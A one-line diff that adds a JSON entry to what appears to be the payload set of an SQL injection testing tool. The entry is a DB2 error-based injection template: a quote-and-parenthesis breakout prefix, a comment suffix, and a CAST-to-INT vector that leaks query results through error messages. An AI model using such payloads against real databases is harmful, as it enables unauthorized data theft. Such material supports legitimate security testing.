@@ -1,0 +1,1 @@
+{"dbms": "db2", "technique": "error", "boundary": {"prefix": "')) ", "suffix": "-- -", "type": "paren2-single-ws"}, "vector": "{B} AND 1=(SELECT CAST(({Q}) AS INT) FROM SYSIBM.SYSDUMMY1)", "comment": "db2 error: single in 2 parens ws"}
